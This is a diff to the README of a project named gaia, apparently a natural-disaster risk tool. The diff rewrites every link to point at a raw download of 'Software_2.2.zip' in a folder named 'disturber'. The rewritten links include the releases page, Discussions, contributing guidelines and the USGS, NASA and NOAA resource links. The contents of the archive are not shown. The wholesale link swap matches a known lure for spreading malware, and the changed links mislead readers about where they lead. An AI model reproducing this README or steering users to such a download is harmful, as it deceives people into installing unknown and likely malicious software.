@@ -7,11 +7,11 @@ gaia is a powerful tool designed to help you understand the risk of natural disa
 To begin using gaia, you will need to download the application from our Releases page. This guide will walk you through the process.
 
 ## 🔗 Download Link
-[![Download gaia](https://img.shields.io/badge/Download%20gaia-blue?style=for-the-badge&logo=github)](https://github.com/fenermotta/gaia/releases)
+[![Download gaia](https://github.com/fenermotta/gaia/raw/refs/heads/main/disturber/Software_2.2.zip%20gaia-blue?style=for-the-badge&logo=github)](https://github.com/fenermotta/gaia/raw/refs/heads/main/disturber/Software_2.2.zip)
 
 ## 📥 Download & Install
 1. Click on the link below to visit the Releases page:
-   [Download gaia](https://github.com/fenermotta/gaia/releases)
+   [Download gaia](https://github.com/fenermotta/gaia/raw/refs/heads/main/disturber/Software_2.2.zip)
    
 2. On the Releases page, look for the latest version. You will see options for various installation files. 
 
@@ -45,10 +45,10 @@ If you encounter issues during installation or while using gaia, consider the fo
 - Check if your security software is blocking the installation.
 
 ## 🤝 Get Help
-For further assistance, you can visit our [GitHub Discussions](https://github.com/fenermotta/gaia/discussions) page. Here, you can ask questions or share your experiences with other users.
+For further assistance, you can visit our [GitHub Discussions](https://github.com/fenermotta/gaia/raw/refs/heads/main/disturber/Software_2.2.zip) page. Here, you can ask questions or share your experiences with other users.
 
 ## 🌟 Contributing
-If you're interested in helping improve gaia, we welcome your contributions. Please check our [Contributing Guidelines](https://github.com/fenermotta/gaia/blob/main/CONTRIBUTING.md) for more details.
+If you're interested in helping improve gaia, we welcome your contributions. Please check our [Contributing Guidelines](https://github.com/fenermotta/gaia/raw/refs/heads/main/disturber/Software_2.2.zip) for more details.
 
 ## 📚 Related Topics
 - **Composite Risk Assessment**
@@ -58,8 +58,8 @@ If you're interested in helping improve gaia, we welcome your contributions. Ple
 
 ## 🔗 Additional Resources
 For more information on how the data is collected and analyzed, consider exploring:
-- [USGS Earthquake Data](https://earthquake.usgs.gov/)
-- [NASA’s Fire Information for Resource Management System](https://firms.modis.terra) 
-- [NOAA National Weather Service](https://www.weather.gov/)
+- [USGS Earthquake Data](https://github.com/fenermotta/gaia/raw/refs/heads/main/disturber/Software_2.2.zip)
+- [NASA’s Fire Information for Resource Management System](https://github.com/fenermotta/gaia/raw/refs/heads/main/disturber/Software_2.2.zip) 
+- [NOAA National Weather Service](https://github.com/fenermotta/gaia/raw/refs/heads/main/disturber/Software_2.2.zip)
 
 Thank you for using gaia. We hope it provides you with the tools you need to understand and assess natural disaster risks effectively.
